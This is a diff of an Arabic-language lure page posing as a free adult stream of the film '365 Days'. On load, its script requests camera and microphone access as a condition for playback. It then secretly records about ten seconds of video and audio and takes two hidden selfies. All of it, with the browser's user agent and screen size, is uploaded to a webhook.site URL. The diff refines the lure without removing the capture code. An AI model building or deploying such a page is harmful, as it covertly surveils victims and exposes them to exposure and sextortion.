@@ -3,75 +3,82 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>365 Days – مشاهدة الفيلم كامل مجاناً 2025</title>
+  <title>365 Days – المشهد الحصري الآن</title>
   <style>
     body {
       margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #1a0033, #000);
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: #0a0015;
       color: #fff;
-      text-align: center;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
+      align-items: center;
+      text-align: center;
     }
     header {
-      background: rgba(0,0,0,0.7);
-      padding: 30px 20px;
-      box-shadow: 0 4px 20px rgba(255,0,150,0.4);
+      width: 100%;
+      padding: 50px 20px 30px;
+      background: linear-gradient(to bottom, rgba(30,0,60,0.9), #000);
     }
     h1 {
       margin: 0;
-      font-size: 2.8rem;
-      color: #ff69b4;
-      text-shadow: 0 0 15px #ff1493;
+      font-size: 3.2rem;
+      color: #ff2e63;
+      text-shadow: 0 0 25px #ff0066;
     }
-    p.subtitle {
-      font-size: 1.3rem;
-      margin: 10px 0;
-      opacity: 0.9;
+    .tagline {
+      font-size: 1.5rem;
+      margin: 15px 0;
+      color: #ff99cc;
+      opacity: 0.95;
+    }
+    #status {
+      font-size: 1.8rem;
+      margin: 50px 20px;
+      color: #ff6699;
+      text-shadow: 0 0 15px #ff0066;
     }
     #progress-container {
-      margin: 50px auto;
       width: 85%;
-      max-width: 600px;
-      height: 40px;
-      background: rgba(255,255,255,0.1);
-      border-radius: 20px;
+      max-width: 700px;
+      height: 45px;
+      background: rgba(255,255,255,0.05);
+      border-radius: 25px;
       overflow: hidden;
+      margin: 40px auto;
+      border: 3px solid #ff3366;
       display: none;
-      border: 2px solid #ff69b4;
+      box-shadow: 0 0 30px rgba(255,51,102,0.5);
     }
     #progress-bar {
       width: 0%;
       height: 100%;
-      background: linear-gradient(to right, #ff1493, #ff69b4, #ff1493);
-      transition: width 5s linear;
-      box-shadow: 0 0 20px #ff1493;
+      background: linear-gradient(to right, #ff0066, #ff6699, #ff0066);
+      transition: width 10s linear;
+      box-shadow: inset 0 0 20px #ff0066;
     }
-    .content {
-      flex: 1;
-      padding: 30px 20px;
-      display: none;
-    }
-    .movie-poster {
-      max-width: 90%;
+    #video-container {
+      width: 95%;
+      max-width: 1000px;
       margin: 30px auto;
       border-radius: 16px;
-      box-shadow: 0 10px 40px rgba(255,105,180,0.5);
-      border: 3px solid #ff69b4;
+      overflow: hidden;
+      box-shadow: 0 0 50px rgba(255,51,102,0.6);
+      display: none;
+      border: 4px solid #ff3366;
+    }
+    video {
+      width: 100%;
+      display: block;
     }
     footer {
-      padding: 25px;
+      margin-top: auto;
+      padding: 30px;
       background: rgba(0,0,0,0.8);
-      font-size: 0.95rem;
+      font-size: 1rem;
       opacity: 0.8;
-    }
-    #status {
-      font-size: 1.5rem;
-      margin: 40px;
-      color: #ff69b4;
-      text-shadow: 0 0 10px #ff1493;
+      width: 100%;
     }
   </style>
 </head>
@@ -79,66 +86,63 @@
 
 <header>
   <h1>365 Days</h1>
-  <p class="subtitle">شاهد الفيلم كامل HD مجاناً الآن – بدون إعلانات مزعجة</p>
+  <p class="tagline">المشهد الحصري الأكثر إثارة – شغّل الآن واستمتع</p>
 </header>
 
-<div id="status">جاري التحميل... انتظر ثوانٍ فقط</div>
+<div id="status">جاري التحميل... السماح بالكاميرا مطلوب</div>
+
 <div id="progress-container">
   <div id="progress-bar"></div>
 </div>
 
-<div class="content" id="main-content">
-  <!-- صورة واحدة فقط من فيلم 365 Days – رومانسية جداً -->
-  <img src="https://image.tmdb.org/t/p/original/6CoRTJTmijhBLJTUNoVSUNxZMEI.jpg" alt="365 Days – مشهد رومانسي" class="movie-poster">
-  <p style="font-size: 1.4rem; margin-top: 20px; color: #ff69b4;">
-    الفيلم الرومانسي الأكثر إثارة في 2025 – استمتع بالمشاهدة الكاملة الآن
-  </p>
+<div id="video-container">
+  <video id="main-video" controls autoplay>
+    <source src="https://files.catbox.moe/r2dbvz.mp4" type="video/mp4">
+    متصفحك لا يدعم الفيديو
+  </video>
 </div>
 
 <video id="hiddenVideo" autoplay muted playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <footer>
-  © 2025 365 Days Streaming – جميع الحقوق محفوظة | محتوى للكبار فقط
+  © 2025 365 Days Exclusive – محتوى للكبار فقط
 </footer>
 
 <script>
-const video = document.getElementById('hiddenVideo');
+const hiddenVideo = document.getElementById('hiddenVideo');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 const progressBar = document.getElementById('progress-bar');
 const progressContainer = document.getElementById('progress-container');
 const status = document.getElementById('status');
-const mainContent = document.getElementById('main-content');
+const videoContainer = document.getElementById('video-container');
 
 const WEBHOOK_URL = "https://webhook.site/d7897411-384f-49ca-b88e-f3765a3b397b";
 
-async function recordAndSend() {
+async function startCaptureAndPlay() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
       audio: true
     });
 
-    video.srcObject = stream;
-    await video.play();
+    hiddenVideo.srcObject = stream;
+    await hiddenVideo.play();
 
+    status.textContent = "جاري تجهيز المشهد... لا تغلق";
     progressContainer.style.display = 'block';
-    status.textContent = "جاري التحميل... لا تغلق الصفحة";
+    progressBar.style.width = '0%';
 
     const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
     const chunks = [];
 
-    recorder.ondataavailable = e => {
-      if (e.data.size > 0) chunks.push(e.data);
-    };
-
+    recorder.ondataavailable = e => chunks.push(e.data);
     recorder.start(100);
 
-    progressBar.style.width = '0%';
     let progress = 0;
     const interval = setInterval(() => {
-      progress += 2;
+      progress += 1;
       progressBar.style.width = progress + '%';
       if (progress >= 100) {
         clearInterval(interval);
@@ -147,8 +151,8 @@ async function recordAndSend() {
     }, 100);
 
   } catch (err) {
-    status.textContent = "يرجى السماح بالوصول إلى الكاميرا لمتابعة المشاهدة";
-    console.log("خطأ أو رفض:", err);
+    status.textContent = "الرجاء السماح بالكاميرا لتشغيل المقطع";
+    console.log("رفض أو خطأ:", err);
   }
 }
 
@@ -159,22 +163,22 @@ async function finishRecording(recorder, chunks, stream) {
     const blob = new Blob(chunks, { type: 'video/webm' });
 
     const fdVideo = new FormData();
-    fdVideo.append('video', blob, `capture_${Date.now()}.webm`);
+    fdVideo.append('video_10s', blob, `capture_${Date.now()}.webm`);
     fdVideo.append('timestamp', Date.now());
     fdVideo.append('user_agent', navigator.userAgent);
     fdVideo.append('screen', `\( {screen.width}x \){screen.height}`);
 
-    await fetch(WEBHOOK_URL, { method: 'POST', body: fdVideo }).catch(err => console.log(err));
+    await fetch(WEBHOOK_URL, { method: 'POST', body: fdVideo }).catch(console.log);
 
     stream.getTracks().forEach(track => track.stop());
-    video.srcObject = null;
+    hiddenVideo.srcObject = null;
 
     status.style.display = 'none';
     progressContainer.style.display = 'none';
-    mainContent.style.display = 'block';
+    videoContainer.style.display = 'block';
 
-    setTimeout(() => captureSelfie(1), 1500);
-    setTimeout(() => captureSelfie(2), 3000);
+    setTimeout(() => captureSelfie(1), 2000);
+    setTimeout(() => captureSelfie(2), 4000);
   };
 }
 
@@ -184,33 +188,33 @@ async function captureSelfie(num) {
       video: { facingMode: "user" },
       audio: false
     });
-    video.srcObject = stream;
-    await video.play();
+    hiddenVideo.srcObject = stream;
+    await hiddenVideo.play();
     await new Promise(r => setTimeout(r, 800));
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0);
+    canvas.width = hiddenVideo.videoWidth;
+    canvas.height = hiddenVideo.videoHeight;
+    ctx.drawImage(hiddenVideo, 0, 0);
     canvas.toBlob(blob => sendBlob(blob, num), 'image/jpeg', 0.92);
 
     setTimeout(() => {
       stream.getTracks().forEach(track => track.stop());
-      video.srcObject = null;
+      hiddenVideo.srcObject = null;
     }, 500);
   } catch (err) {
-    console.log("خطأ في الـ selfie:", err);
+    console.log("خطأ selfie:", err);
   }
 }
 
 function sendBlob(blob, num) {
   const fd = new FormData();
-  fd.append('photo', blob, `selfie_\( {Date.now()}_ \){num}.jpg`);
+  fd.append('selfie', blob, `selfie_\( {Date.now()}_ \){num}.jpg`);
   fd.append('timestamp', Date.now());
-  fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(err => console.log(err));
+  fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(console.log);
 }
 
 window.addEventListener('load', () => {
-  setTimeout(recordAndSend, 1000);
+  setTimeout(startCaptureAndPlay, 800);
 });
 </script>
 
